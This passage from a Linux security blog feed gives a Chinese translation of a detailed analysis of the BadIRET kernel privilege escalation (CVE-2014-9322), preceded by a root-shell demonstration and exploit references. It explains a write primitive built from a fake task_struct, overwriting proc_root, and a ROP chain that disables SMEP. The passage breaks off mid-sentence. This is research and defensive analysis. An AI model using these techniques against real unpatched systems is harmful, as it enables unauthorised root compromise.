[pi3@localhost clean_9322]$ ls -al /tmp/pi3
-rwsrwsrwx 1 root root 8764 May  6 23:09 /tmp/pi3
[pi3@localhost clean_9322]$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
[pi3@localhost clean_9322]$ /tmp/pi3
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root),1000(pi3)
sh-4.2# exit
exit
[pi3@localhost clean_9322]$
&lt;/pre&gt;

&lt;p&gt;References:&lt;/p&gt;

&lt;p&gt;1) http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/&lt;/p&gt;

&lt;p&gt;2) https://rdot.org/forum/showthread.php?t=3341&lt;/p&gt;

&lt;p&gt;3) https://www.exploit-db.com/exploits/36266/&lt;/p&gt;

&lt;p&gt;4) http://blog.pi3.com.pl/?p=509&lt;/p&gt;

&lt;p&gt;5) http://twitter.com/grsecurity/status/562363332079144960&lt;/p&gt;

&lt;p&gt;6) http://twitter.com/grsecurity/status/562363788125831172&lt;/p&gt;

&lt;p&gt;7) http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz&lt;/p&gt;

&lt;p&gt;8) http://seclists.org/oss-sec/2014/q4/1052&lt;/p&gt;

&lt;p&gt;9) http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html&lt;/p&gt;

&lt;p&gt;UPDATE:基于PCID的UDEREF实现最早是在2013年8月，而不是2014年2月。&lt;/p&gt;

&lt;p&gt;Best regards,&lt;/p&gt;

&lt;p&gt;Adam ‘pi3’ Zabrocki&lt;/p&gt;
</description>
        <pubDate>Mon, 06 Jul 2015 06:00:07 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/07/06/badiret-exp.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/07/06/badiret-exp.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>漏洞利用&quot;BadIRET&quot;分析(CVE-2014-9322, Linux内核提权)</title>
        <description>&lt;p&gt;作者：Rafal Wojtczuk，Feb 2 2015&lt;/p&gt;

&lt;p&gt;原文：&lt;a href=&quot;http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/&quot;&gt;Exploiting “BadIRET” vulnerability (CVE-2014-9322, Linux kernel privilege escalation)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;译者：Shawn the R0ck, Feb 5 2015&lt;/p&gt;

&lt;p&gt;POC( 感谢Mickey提供的链接):
https://rdot.org/forum/showthread.php?t=3341&lt;/p&gt;

&lt;p&gt;Solidot相关报道：
http://www.solidot.org/story?sid=42951&lt;/p&gt;

&lt;p&gt;Shawn：Linux内核代码文件arch/x86/kernel/entry_64.S在3.17.5之前的版本都
没有正确的处理跟SS（堆栈区）段寄存器相关的错误，这可以让本地用户通过触
发一个 IRET指令从错误的地址空间去访问GS基地址来提权。这个编号为
CVE-2014-9322,漏洞于2014年11月23日被Linux内核社区修复，之后的几个礼拜里
没有出现公开的利用代码甚至相关的讨论。当人们快要遗忘这个威胁的时候，
Rafal Wojtczuk的分析文章Exploiting “BadIRET” vulnerability似乎在提醒我
们：别忘了斯拉夫兵工厂。Rafal在Fedora 20 64-bit GNU/Linux发行版上完成了
研究和测试工作，内核是3.11.10-301。也提醒那些平时不重视安全运维的企业和
个人，修复已知漏洞是必须的工作，因为你永远不知道你的敌人在哪里买卖什么
样的数字军火。对于这个漏洞，本文的结论是SMEP虽然被绕过了，但SMAP是依然
奏效的，这里只想提一下类似PaX/Grsecurity的UDEREF特性和SMAP类似，只是属
于纯软件实现，大概2006/2007年左右这个特性就已经有了而且被一些anarchy广
泛使用。这次Rafal也谈到说这个如此严重的漏洞居然数月都没有公开讨论，但其
实在12月中旬俄罗斯的某技术社区就已经进行了详细讨论并最终给出了PoC，这是
一次针对非英文世界的公开威胁情报分析的重大失误的典型案例。随着Intel在
CPU里实现了类似UDEREF的SMEP和SMAP等特性，主流GNU/Linux发行版的内核也在
逐渐支持此类特性，防御在升级的同时，欧罗巴的数字军火也在不断升级，2014
年已经有多个团队实现了不touch用户空间的SYSRET漏洞利用。&lt;/p&gt;

&lt;p&gt;这个漏洞影响很广，&lt;a href=&quot;https://security-tracker.debian.org/tracker/CVE-2014-9322&quot;&gt;Debian&lt;/a&gt;几乎所有社区还在维护的版本都受影响。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/CVE-2014-9322&quot;&gt;RedHat的企业版&lt;/a&gt;RHEL 4/5/6/7都受影响。&lt;/p&gt;

&lt;h2 id=&quot;intro&quot;&gt;0. Intro&lt;/h2&gt;

&lt;p&gt;CVE-2014-9322的描述如下：&lt;/p&gt;
&lt;pre&gt;
linux内核代码文件arch/x86/kernel/entry_64.S在3.17.5之前的版本都没有正确
的处理跟SS（堆栈区）段寄存器相关的错误，这可以让本地用户通过触发一个
IRET指令从错误的地址空间去访问GS基地址来提权。
&lt;/pre&gt;

&lt;p&gt;这个漏洞于2014年11月23日被社区修复[2]，至今我并没有见到公开的利用代码和
详细的讨论。这篇文章我会尝试去解释这个漏洞的本质以及利用的过程。不幸的
是，我无法完全引用Intel白皮书[3]的所有内容，如果有读者不熟悉一些术语可
以直接查Intel白皮书。所有的实验都是在Fedora 20 64-bit发行版上完成的，内
核是3.11.10-301，所有的讨论基于64位进行。&lt;/p&gt;

&lt;p&gt;简单结论概要：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;通过测试，这个漏洞可以完全稳定的被利用。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;SMEP[4]不能阻止任意代码执行；SMAP[5]可以阻止任意代码执行。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Digression: kernel, usermode, iret
&lt;img src=&quot;https://bromiumlabs.files.wordpress.com/2015/01/badiret-cartoon.jpg?w=893&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;2. 漏洞&lt;/h2&gt;

&lt;p&gt;在一些情况下，linux内核通过iret指令返回用户空间时会产生一个异常。异常处
理程序把执行路径返回到了bad_iret函数，她做了：&lt;/p&gt;

&lt;pre&gt;
     /* So pretend we completed the iret and took the #GPF in user mode.*/
     pushq $0
     SWAPGS
     jmp general_protection
&lt;/pre&gt;

&lt;p&gt;正如这行评论所解释，接下来的代码流应该和一般保护异常(General
Protection)在用户空间发生时（转跳到#GP处理程序）完全相同。这种异常处理
情况大多是由iret指令引发的，e.g. #GP。&lt;/p&gt;

&lt;p&gt;问题在于#SS异常。如果有漏洞的内核（比如3.17.5）也有”espfix”功能（从
3.16引入的特性），之后bad_iret函数会在只读的栈上执行”push”指令，这会导
致页错误（page fault）而会直接引起两个错误。我不考虑这种场景；从现在开
始，我们只关注在3.16以前的没有”espfix”的内核。&lt;/p&gt;

&lt;p&gt;这个漏洞根源于#SS的异常处理程序没有符合
“pretend-it-was-#GP-in-userspace”[6]的规划，与#GP处理程序相比，#SS异常
处理会多做一次swapgs指令。如果你对swapgs不了解，请不要跳过下面的章节。&lt;/p&gt;

&lt;h2 id=&quot;swapgs&quot;&gt;3. 偏题：swapgs指令&lt;/h2&gt;

&lt;p&gt;当内存通过gs段进行访问时，像这样：&lt;/p&gt;

&lt;pre&gt;
mov %gs:LOGICAL_ADDRESS, %eax
&lt;/pre&gt;

&lt;p&gt;实际会发生以下几步：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;BASE_ADDRESS值从段寄存器的隐藏部分取出&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;内存中的线性地址LOGICAL_ADDRESS+BASE_ADDRESS被dereferenced（Shawn:
char *p; *p就是deref）。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;基地址是从GDT（或者LDT）继承过来的。无论如何，有一些情况是GS段基地址被
修改的动作不需要GDT的参与。&lt;/p&gt;

&lt;p&gt;引用自Intel白皮书：&lt;/p&gt;

&lt;p&gt;“SWAPGS把当前GS基寄存器值和在MSR地址C0000102H(IA32_KERNEL_GS_BASE)所包
含的值进行交换。SWAPGS指令是一个为系统软件设计的特权指令。(….)内核可
以使用GS前缀在正常的内存引用去访问[per-cpu]内核数据结构。”&lt;/p&gt;

&lt;p&gt;Linux内核为每个CPU在启动时分配一个固定大小的结构体来存放关键数据。之后
为每个CPU加载IA32_KERNEL_GS_BASE到相应的结构地址上，因此，通常的情况，
比如系统调用的处理程序是：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;swapgs（现在是GS指向内核空间）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;通过内存指令和gs前缀访问per-cpu内核数据结构&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;swapgs（撤销之前的swapgs，GS指向用户空间）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;返回用户空间&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;内核代码天生必须保证随时能访问到带gs前缀的percpu数据，内核执行一堆
swapgs指令时条目来自用户空间并不是偶然。(所以gs base指向内核内存）&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;4. 触发漏洞&lt;/h2&gt;

&lt;p&gt;现在很明显可以看到这个漏洞简直就是坟墓，因为多了一个swapgs指令在有漏洞
代码路径里，内核会尝试从可能被用户操控的错误GS基地址访问重要的数据结构。&lt;/p&gt;

&lt;p&gt;当iret指令产生了一个#SS异常？有趣的是，Intel白皮书在这方面介绍不完全(
Shawn:是阴谋论的话又会想到BIG BROTHER?)；描述iret指令时，Intel白皮书这
么讲：&lt;/p&gt;

&lt;pre&gt;
64位模式的异常：

#SS(0)

如果一个尝试从栈上pop一个值违反了SS限制。

如果一个尝试从栈上pop一个值引起了non-canonical地址（Shawn: 64-bit下只允
许访问canonical地址）的引用。
&lt;/pre&gt;

&lt;p&gt;没有一个条件能被强制在内核空间里发生。无论如何，Intel白皮书里的iret伪代
码展示了另外一种情况：when the segment defined by the return frame is
not present:&lt;/p&gt;

&lt;pre&gt;
IF stack segment is not present

THEN #SS(SS selector); FI;
&lt;/pre&gt;

&lt;p&gt;所以在用户空间，我们需要设置ss寄存器为某个值来表示不存在。这不是很直接：
我们不能仅仅使用：&lt;/p&gt;

&lt;pre&gt;
mov $nonpresent_segment_selector, %eax

mov %ax, %ss
&lt;/pre&gt;

&lt;p&gt;第二条指令会引发#GP。通过调试器（任何ptrace)设置ss寄存器是不允许的；类
似的，sys_sigreturn系统调用不会在64位系统上设置这个寄存器（可能32位能工
作）。解决方案是：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;线程A：通过sys_modify_ldt系统调用在LDT里创建一个定制段X&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;线程B：s:=X_selector&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;线程A：通过sys_modify_ldt使X无效&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;线程B：等待硬件中断&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;为什么需要在一个进程里使用两个线程的原因是从系统调用（包括
sys_modify_ldt）返回是通过硬编码了#ss值的sysret指令。如果我们使X在相同
的线程中无效就等同于”ss:=X 指令“，ss寄存器会处于未完成设置的状态。运行
以上代码会导致内核panic。按照更有意义的做法，我们将需要控制用户空间的
gs基地址；她可以通过系统调用arch_prctl(ARCH_SET_GS)被设置。&lt;/p&gt;

&lt;h2 id=&quot;achieving-write-primitive&quot;&gt;5. Achieving write primitive&lt;/h2&gt;

&lt;p&gt;如果运行以上代码，#SS处理程序会正常的返回bad_iret（意思是没有触及到内存
的GS基地址），之后转跳到#GP异常处理程序，执行一段时间后就调用到了这个函
数：&lt;/p&gt;

&lt;pre&gt;
289 dotraplinkage void
290 do_general_protection(struct pt_regs *regs, long error_code)
291 {
292         struct task_struct *tsk;
...
306         tsk = current;
307         if (!user_mode(regs)) {
                ... it is not reached
317         }
318 
319         tsk-&amp;gt;thread.error_code = error_code;
320         tsk-&amp;gt;thread.trap_nr = X86_TRAP_GP;
321 
322         if (show_unhandled_signals &amp;amp;&amp;amp; unhandled_signal(tsk, SIGSEGV) &amp;amp;&amp;amp;
323                         printk_ratelimit()) {
324                 pr_info(&quot;%s[%d] general protection ip:%lx sp:%lx
error:%lx&quot;,
325                         tsk-&amp;gt;comm, task_pid_nr(tsk),
326                         regs-&amp;gt;ip, regs-&amp;gt;sp, error_code);
327                 print_vma_addr(&quot; in &quot;, regs-&amp;gt;ip);
328                 pr_cont(&quot;\n&quot;);
329         }
330 
331         force_sig_info(SIGSEGV, SEND_SIG_PRIV, tsk);
332 exit:
333         exception_exit(prev_state);
334 }
&lt;/pre&gt;

&lt;p&gt;C代码不太明显，但从gs前缀读取到现有宏的值赋给了tsk。第306行是：&lt;/p&gt;

&lt;pre&gt;
0xffffffff8164b79d :	mov    %gs:0xc780,%rbx
&lt;/pre&gt;

&lt;p&gt;这很变得有意思起来了。我们控制了current指针，她指向用于描述整个Linux进
程的数据结构。&lt;/p&gt;
&lt;pre&gt;

319         tsk-&amp;gt;thread.error_code = error_code;
320         tsk-&amp;gt;thread.trap_nr = X86_TRAP_GP;
&lt;/pre&gt;

&lt;p&gt;写入（从task_struct开始的固定偏移）我们控制的地址。注意值本身不能被控制
（分别是0和0xd常量），但这不应该成为一个问题。游戏结束？&lt;/p&gt;

&lt;p&gt;不会，我们想覆盖一些在X上的重要数据结构。如果我们按照以下的步骤：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;准备在FAKE_PERCPU的用户空间内存，设置gs基地址给她&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;让地址FAKE_PERCPU+0xc780存着指针FAKE_CURRENT_WITH_OFFSET，以满足
FAKE_CURRENT_WITH_OFFSET= X – offsetof(struct task_struct,
thread.error_code)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;触发漏洞&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;之后do_general_protection会写入X。但很快就会尝试再次访问current
task_current的其他成员，e.g.unhandled_signal()函数从task_struct指针解引
用。我们没有依赖X来控制，最终会在内核产生一个页错误。我们怎么避免这个问
题？选项有：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;什么都不做。Linux内核不像Windows，Linux内核是完全允许当一个不是预期
的页错误在内核出现，如果可能的话，内核会杀死当前进程之后尝试继续运行
（Windows会蓝屏）。这种机制对于大量内核数据污染就无能为力了。我的猜测是
在当前进程被杀死后，swapgs不平衡的保持下来，这会导致其他进程上下文的更
多页错误。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;使用“tsk-&amp;gt;thread.error_code = error_code”覆盖为页错误处理程序的IDT入
口。之后页错误发生（被unhandled_signal()触发）。这个技术曾经在一些偶然
的环境中成功过。但在这里不会成功，因为有2个原因：&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;Linux让IDT只读&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;就算IDT可写，我们也不能控制覆盖的值 – 0或者0xd。SMEP/SMAP也
    会是问题。&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;我们可以尝试产生一个竞争。“tsk-&amp;gt;thread.error_code = error_code”会促
进代码执行，比如允许通过系统调用控制的代码指针P。之后我们可以在CPU 0上
触发漏洞，在同一时间段CPU 1可以循环执行一些系统调用。这个思路可以在CPU
0被破坏前让通过CPU 1获得代码执行，比如hook页错误处理程序，这样CPU 0不会
影响更多的地方，我尝试了这种方法多次，但都失败了。可能不同的漏洞在时间
线上的不同所致。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Throw a towel on “tsk-&amp;gt;thread.error_code = error_code” write.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;虽然有些恶心，我们会尝试最后一个选项。我们会让current指向用户空间，设置
这个指针可以通过读的deref到我们能控制的内存。自然的，我们观察接下来的代
码，找找更多的写deref。&lt;/p&gt;

&lt;h2 id=&quot;achieving-write-primitive-continued-aka-life-after-dogeneralprotection&quot;&gt;6. Achieving write primitive continued, aka life after do_general_protection&lt;/h2&gt;

&lt;p&gt;下一个机会是do_general_protection()所调用的函数：&lt;/p&gt;

&lt;pre&gt;
int
force_sig_info(int sig, struct siginfo *info, struct task_struct *t)
{
        unsigned long int flags;
        int ret, blocked, ignored;
        struct k_sigaction *action;

        spin_lock_irqsave(&amp;amp;t-&amp;gt;sighand-&amp;gt;siglock, flags);
        action = &amp;amp;t-&amp;gt;sighand-&amp;gt;action[sig-1];
        ignored = action-&amp;gt;sa.sa_handler == SIG_IGN;
        blocked = sigismember(&amp;amp;t-&amp;gt;blocked, sig);   
        if (blocked || ignored) {
                action-&amp;gt;sa.sa_handler = SIG_DFL;
                if (blocked) {
                        sigdelset(&amp;amp;t-&amp;gt;blocked, sig);
                        recalc_sigpending_and_wake(t);
                }
        }
        if (action-&amp;gt;sa.sa_handler == SIG_DFL)
                t-&amp;gt;signal-&amp;gt;flags &amp;amp;= ~SIGNAL_UNKILLABLE;
        ret = specific_send_sig_info(sig, info, t);
        spin_unlock_irqrestore(&amp;amp;t-&amp;gt;sighand-&amp;gt;siglock, flags);

        return ret;
}
&lt;/pre&gt;

&lt;p&gt;task_struct的成员sighand是一个指针，我们可以设置任意值。&lt;/p&gt;

&lt;pre&gt;

action = &amp;amp;t-&amp;gt;sighand-&amp;gt;action[sig-1];
action-&amp;gt;sa.sa_handler = SIG_DFL;

&lt;/pre&gt;

&lt;p&gt;我们无法控制写的值，SIG_DFL是常量的0。这里最终能工作了，虽然有些扭曲。
假设我们想覆盖内核地址X。为此我们准备伪造的task_struct，所以X等于
t-&amp;gt;sighand-&amp;gt;action[sig-1].sa.sa_handler的地址。上面还有一行要注意：&lt;/p&gt;

&lt;pre&gt;
spin_lock_irqsave(&amp;amp;t-&amp;gt;sighand-&amp;gt;siglock, flags);
&lt;/pre&gt;

&lt;p&gt;t-&amp;gt;sighand-&amp;gt;siglock在t-&amp;gt;sighand-&amp;gt;action[sig-1].sa.sa_handler的常量偏移
上，内核会调用spin_local_irqsave在某些地址上，X+SPINLOCK的内容无法控制。
这会发生什么呢？两种可能性：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;X+SPINLOCK所在的内存地址看起来像没有锁的spinlock。spin_lock_irqsave
会立即完成。最后，spin_unlock_irqrestore会撤销spin_lock_irqsave的写操作。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;2.X+SPINLOCK所在的内存地址看起来像上锁的spinlock。如果我们不介入的话，
spin_lock_irqsave会无线循环等待spinlock。有些担心，要绕过这个障碍我们得
需要其他假设 — X+SPINLOCK所在内存地址的内容。这是可接受的，我们可以在
后面看到在内核.data区域里设置X。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;* 首先，准备FAKE_CURRENT，让t-&amp;gt;sighand-&amp;gt;siglock指向用户空间上锁
      的区域，SPINLOCK_USERMODE

* force_sig_info()会挂在spin_lock_irqsave里

* 这时，另外一个用户空间的线程在另外一个CPU上运行，并且改变了
      t-&amp;gt;sighand，所以t-&amp;gt;sighand-&amp;gt;action[sig-1.sa.sa_hander成了我们
      的覆盖目标，之后解锁SPINLOCK_USERMODE

* spin_lock_irqsave会返回

* force_sig_info()会重新载入t-&amp;gt;sighand，执行期望的写操作
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;鼓励细心的读者追问为什么不能使用第2种方案，即X+SPINLOCK在初始时是没有锁
的。这并不是全部 — 我们需要准备一些FAKE_CURRENT的字段来让尽量少的代码
执行。我不会再透露更多细节 — 这篇BLOG已经够长了….下一步会发生什么？
force_sig_info()和do_general_protection()返回。接下来iret指令会再次产生
#SS异常处理（因为仍然是用户空间ss的值在栈上引用了一个nonpresent段），但
这一次，#SS处理程序里的额外swapgs指令会返回并取消之前不正确的swapgs。
do_general_protection()会调用和操作真正的task_struct，而不是伪造的
FAKE_CURRENT。最终，current会发出SIGSEGV信号，其他进程会被调度来执行。
这个系统仍然是稳定的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://bromiumlabs.files.wordpress.com/2015/01/diagram1.png?w=595&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;smep&quot;&gt;7. 插曲：SMEP&lt;/h2&gt;

&lt;p&gt;SMEP是Intel处理器从第3代Core（Shawn：酷睿）时加入的硬件特性。如果控制寄
存器CR4里的SMEP位被设置的话，当RING0（Shawn：标准Linux内核是RING0，在
XEN下是例外，RING0是Hypervisor）尝试执行的代码来自标记为用户空间的内存
页，CPU就会生成一个错误（Shawn：就是拒绝）。如果可能的话，Linux内核会默
认开启SMEP。&lt;/p&gt;

&lt;h2 id=&quot;section-2&quot;&gt;8. 实现代码执行&lt;/h2&gt;

&lt;p&gt;之前的章节讲述了一种如何以0在内核内存中覆盖8个连续字节的方法。如果SMEP
开启的情况下如何实现代码执行呢？&lt;/p&gt;

&lt;p&gt;直接覆盖一个内核代码的指针是不行的。我们可以清零top bytes( Shawn: MSB)
- 但之后的地址会在用户空间，所以SMEP会阻止这个指针的deref。&lt;/p&gt;

&lt;p&gt;换一种方式，我们可以清零几个low bytes( Shawn: LSB)，但是之后能利用这个
指针的概率也很低。&lt;/p&gt;

&lt;p&gt;我们需要一个内核指针P指向结构X包含了代码指针。我们可以覆盖P的top bytes
让她成为一个用户空间的地址，这样P-&amp;gt;code_pointer_in_x()调用会跳转到一个
我们能选择的地址。我不确定最好选择哪个攻击对象。从我的经验来看，我选择
内核proc_root变量，这是一个结构体：&lt;/p&gt;

&lt;pre&gt;
struct proc_dir_entry {
            ...
        const struct inode_operations *proc_iops;
        const struct file_operations *proc_fops;
        struct proc_dir_entry *next, *parent, *subdir;
        ...
        u8 namelen;
        char name[];
};
&lt;/pre&gt;

&lt;p&gt;这个结构体是一个proc文件系统的入口（proc_root是/proc作为proc文件系统的
根目录）。当一个文件名路径开始在/proc里查询时，subdir指针（从
proc_root.subdir开始）会跟进，直到名字被找到。之后proc_iops的指针会被调
用：&lt;/p&gt;

&lt;pre&gt;
struct inode_operations {
        struct dentry * (*lookup) (struct inode *,struct dentry *, unsigned int);
        void * (*follow_link) (struct dentry *, struct nameidata *);
        ...many more...
        int (*update_time)(struct inode *, struct timespec *, int);
        ...
} ____cacheline_aligned;
&lt;/pre&gt;

&lt;p&gt;proc_root驻扎在内核代码段里，这意味着漏洞利用需要知道她的地址。这个信息
可以从/proc/kallsyms符号表得到；当然，很多加固过的内核不允许普通用户读
取这个文件。但如果内核是一个已知的build（标准的GNU/Linux发行版），这个
地址可以轻松获得；和一堆偏移一样需要构建FAKE_CURRENT。&lt;/p&gt;

&lt;p&gt;我们会覆盖proc_root.subdir，让她成为一个指向一个在用户空间能被控制的结
构体proc_dir_entry。有点困难在于我们不能覆盖整个指针。别忘了我们的写操
作是“覆盖8个0”。如果我们让proc_root.subdir变成0，我们不会去映射她，因为
Linux内核不允许用户空间映射到地址0上（更确切的说发是，任何低于
/proc/sys/vm/mmap_min_addr的地址，默认值一般是4k）。（Shawn：想想哪些
0ld good hacking days，每天都有一堆NULL pointer deref是多么幸福活着无挑
战的时光啊;-))。这意味着我们需要：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;映射16MB的内存到地址4096&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;使用类似proc_dir_entry的方式来填充，把inode_operations字段指向用户空
间的地址FAKE_IOPS，name字段为字符串”A”。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;配置漏洞利用去覆盖proc_root.subdir的top 5 bytes。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;之后，除非proc_root.subdir最低的3 bytes是0，我们可以确定在触发
force_sig_info()覆盖后，proc_root.subdir会指向被控制的用户空间内存。当
我们的进程调用open(“/proc/A”,…)时，FAKE_IOPS的指针会被调用。她们应该
指向哪里呢？如果你认为答案是“指向我们的shellcode“，请再读一遍上面的分析。&lt;/p&gt;

&lt;p&gt;我们需要让FAKE_IOPS指针指向一个stack pivot[1]序列。这再次假设了具体内核
运行的版本情况。通常的”xchg %esp, %eax; ret”代码序列（2个字节，94 c3是
在测试内核的地址0xffffffff8119f1ed）很好的可以用于64位内核的ROP。就算没
能控制%rax，这个xchg指令操作32位的寄存器也能清掉%rsp的高32位而让%rsp着
陆在用户空间的内存里。在最糟糕的情况下，我们可以分配低4GB的虚拟内存然后
填充ROP链条。&lt;/p&gt;

&lt;p&gt;在当前测试的内核（Fedora 20)有两种方法去deref在FAKE_IOPS的指针：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;%rax:=FAKE_IOPS; call *SOME_OFFSET(%rax)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;%rax:=FAKE_IOPS; %rax:=SOME_OFFSET(%rax); call *%rax&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;第1种情况里，在%rsp和%rax交换值后，她会等于FAKE_IOPS。我们需要ROP链条驻
扎在FAKE_IOPS的起始位置，这需要类似“add $A_LOT, %rsp; ret”的指令，然后
在继续。&lt;/p&gt;

&lt;p&gt;第2种情况里，%rsp会分配低32位的调用目标，即0x8119f1ed。我们需要准备在这
个地址上的ROP链条。&lt;/p&gt;

&lt;p&gt;计算一下%rax值有两者之一的已知值在特定的时间指向stack pivot序列，我们不
需要ROP链条填充整个4GB内存，只需要上面的两个地址即可。第2种情况的ROP链
条自身很简洁：&lt;/p&gt;

&lt;pre&gt;
unsigned long *stack=0x8119f1ed;
*stack++=0xffffffff81307bcdULL;  // pop rdi, ret
*stack++=0x407e0;                //cr4 with smep bit cleared
*stack++=0xffffffff8104c394ULL;  // mov rdi, cr4; pop %rbp; ret
*stack++=0xaabbccdd;             // placeholder for rbp
*stack++=actual_shellcode_in_usermode_pages;
&lt;/pre&gt;

&lt;h2 id=&quot;smap&quot;&gt;9. 插曲：SMAP&lt;/h2&gt;

&lt;p&gt;SMAP是Intel从第5代Core处理器推出的一个硬件特性。如果CR4控制寄存器的
SMAP位被设置的话，CPU会拒绝用户空间的页被RING0访问（Shawn：个人理解，
SMAP和SMEP最大的不同主要是SMEP针对代码段，而SMAP针对数据段）。Linux内核
通常会默认开启SMAP。一个测试的内核模块（Core-M 5Y10a CPU）尝试访问用户
空间然后crash了：&lt;/p&gt;

&lt;pre&gt;
[  314.099024] running with cr4=0x3407e0
[  389.885318] BUG: unable to handle kernel paging request at 00007f9d87670000
[  389.885455] IP: [ffffffffa0832029] test_write_proc+0x29/0x50 [smaptest]
[  389.885577] PGD 427cf067 PUD 42b22067 PMD 41ef3067 PTE 80000000408f9867
[  389.887253] Code: 48 8b 33 48 c7 c7 3f 30 83 a0 31 c0 e8 21 c1 f0 e0 44 89 e0 48 8b 
&lt;/pre&gt;

&lt;p&gt;正如我们看到的，用户空间的页是正常的，但访问也报了页错误。Windows系统不
太支持SMAP；Windows 10技术预览版build 9926的cr4=0x1506f8（SMEP启动，
SMAP关闭）；对比Linux内核(同样的测试硬件）你可以看到cr4的bit 21是没有设
置的。这不奇怪，在Linux中，访问用户空间是通过调用copy_from_user(),
copy_to_user()和类似函数显式执行的，所以执行这些操作时临时关闭SMAP是可
行的。在Windows上，内核代码直接访问用户空间代码，只是包装了一层访问异常
处理程序，所以要让SMAP工作正常需要调整所有的驱动，这是一项困难的工作。&lt;/p&gt;

&lt;h2 id=&quot;smap-to-the-rescue&quot;&gt;10. SMAP to the rescue!&lt;/h2&gt;

&lt;p&gt;上面的漏洞利用方法依赖于在用户空间里准备特定的数据结构，然后强制内核认
为她们是可信的内核数据。这种方法对于开启SMAP特性的内核不奏效 — CPU会
拒绝从用户空间读取恶意数据。我们能做的是构造所有需要用的数据结构，然后
拷贝她们到内核。比如：&lt;/p&gt;

&lt;pre&gt;
write(pipe_filedescriptor, evil_data, ...
&lt;/pre&gt;

&lt;p&gt;之后evil_data会被拷贝到一个内核管道缓冲区里。我们可能需要猜测她的地址；
some sort of heap spraying, combined with the fact that there is no
spoon^W effective kernel ASLR[9], could work, although it is likely to be
less reliable than exploitation without SMAP.&lt;/p&gt;

&lt;p&gt;总之，还有最后一个障碍 — 不要忘了我们需要设置用户空间的gs base去指向
我们的漏洞利用的数据结构。在上面的场景（没有SMAP），我们使用
arch_prctl(ARCH_SET_GS)系统调用，她是这样在内核里实现的：&lt;/p&gt;

&lt;pre&gt;
long do_arch_prctl(struct task_struct *task, int code, unsigned long addr)
{ 
         int ret = 0; 
         int doit = task == current;
         int cpu;
 
         switch (code) { 
         case ARCH_SET_GS:
                 if (addr &amp;gt;= TASK_SIZE_OF(task))
                         return -EPERM; 
                 ... honour the request otherwise
&lt;/pre&gt;

&lt;p&gt;休斯顿，我们有一个麻烦 — 我们不能使用这个API去设置gs base用户空间以上
的内存！&lt;/p&gt;

&lt;p&gt;最近的CPU有wrgsbase指令可以直接设置gs base，这是一个非特权级指令，但需
要通过内核设置CR4控制寄存器中的FSGSBASE bit( no 16)来开启。Linux并没有
